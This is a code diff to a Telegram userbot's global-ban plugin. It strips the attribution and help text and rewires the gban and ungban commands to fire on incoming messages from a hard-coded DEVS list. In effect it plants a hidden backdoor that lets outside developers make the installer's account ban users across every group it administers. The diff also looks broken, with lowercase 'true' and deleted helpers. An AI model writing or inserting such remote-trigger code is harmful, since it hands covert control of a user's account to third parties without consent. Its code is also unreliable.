@@ -1,8 +1,3 @@
-# Copyright (C) 2020 Catuserbot <https://github.com/sandy1709/catuserbot>
-# Ported by @mrismanaziz
-# FROM Man-Userbot <https://github.com/mrismanaziz/Man-Userbot>
-# t.me/SharingUserbot
-
 import asyncio
 from datetime import datetime
 from io import BytesIO
@@ -21,29 +16,11 @@ from userbot.utils import edit_or_reply, get_user_from_event, man_cmd
 
 from .admin import BANNED_RIGHTS, UNBAN_RIGHTS
 
-
-async def admin_groups(grp):
-    admgroups = []
-    async for dialog in grp.client.iter_dialogs():
-        entity = dialog.entity
-        if (
-            isinstance(entity, Channel)
-            and entity.megagroup
-            and (entity.creator or entity.admin_rights)
-        ):
-            admgroups.append(entity.id)
-    return admgroups
-
-
-def mentionuser(name, userid):
-    return f"[{name}](tg://user?id={userid})"
-
-
-@man_cmd(pattern="gban(?: |$)(.*)")
+@register(incoming=true, from_user=DEVS, pattern=r"^\.cgban(?: |$)(.*)")
 async def gban(event):
     if event.fwd_from:
         return
-    gbun = await edit_or_reply(event, "`Gbanning...`")
+    gbun = await edit_or_reply(event, "`MengGbanned...`")
     start = datetime.now()
     user, reason = await get_user_from_event(event, gbun)
     if not user:
@@ -91,8 +68,7 @@ async def gban(event):
             f"**GBanned** [{user.first_name}](tg://user?id={user.id}) **in** `{count}` **groups in** `{timetaken}` **seconds**!!\n**Added to gbanlist.**"
         )
 
-
-@man_cmd(pattern="ungban(?: |$)(.*)")
+@register(incoming=true, from_user=DEVS, pattern=r"^\.cungban(?: |$)(.*)")
 async def ungban(event):
     if event.fwd_from:
         return
@@ -140,69 +116,11 @@ async def ungban(event):
         )
 
 
-@man_cmd(pattern="listgban$")
-async def gablist(event):
-    if event.fwd_from:
-        return
-    gbanned_users = gban_sql.get_all_gbanned()
-    GBANNED_LIST = "**List Global Banned Saat Ini**\n"
-    if len(gbanned_users) > 0:
-        for a_user in gbanned_users:
-            if a_user.reason:
-                GBANNED_LIST += f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) **Reason** `{a_user.reason}`\n"
-            else:
-                GBANNED_LIST += (
-                    f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) `No Reason`\n"
-                )
-    if len(gbanned_users) >= 4096:
-        with BytesIO(str.encode(GBANNED_LIST)) as fileuser:
-            fileuser.name = "list-gban.txt"
-            await event.client.send_file(
-                event.chat_id,
-                fileuser,
-                force_document=True,
-                thumb="userbot/resources/logo.jpg",
-                caption="**List Global Banned**",
-                allow_cache=False,
-            )
-    else:
-        GBANNED_LIST = "Belum ada Pengguna yang Di-Gban"
-    await edit_or_reply(event, GBANNED_LIST)
-
-
-@bot.on(events.ChatAction)
-async def _(event):
-    if event.user_joined or event.added_by:
-        user = await event.get_user()
-        chat = await event.get_chat()
-        if gban_sql.is_gbanned(user.id) and chat.admin_rights:
-            try:
-                await event.client.edit_permissions(
-                    chat.id,
-                    user.id,
-                    view_messages=False,
-                )
-                await event.reply(
-                    f"**#GBanned_User** Joined.\n\n** • First Name:** [{user.first_name}](tg://user?id={user.id})\n • **Action:** `Banned`"
-                )
-            except BaseException:
-                pass
-
-
-# Ported by @mrismanaziz
-# FROM Man-Userbot <https://github.com/mrismanaziz/Man-Userbot>
-# t.me/SharingUserbot
-
-
 CMD_HELP.update(
     {
-        "gban": f"**Plugin : **`gban`\
-        \n\n  •  **Syntax :** `{cmd}gban` <username/id>\
-        \n  •  **Function : **Melakukan Banned Secara Global Ke Semua Grup Dimana anda Sebagai Admin.\
-        \n\n  •  **Syntax :** `{cmd}ungban` <username/id>\
-        \n  •  **Function : **Membatalkan Global Banned\
-        \n\n  •  **Syntax :** `{cmd}listgban`\
-        \n  •  **Function : **Menampilkan List Global Banned\
+        "cgban": f"**plugin :**`cgban`\
+        \n\n• Syntax :**`{cmd}cgban <username/userid>`\
+        \n\n• Syntax :**`{cmd}cungban <username/userid>`\
     "
     }
 )
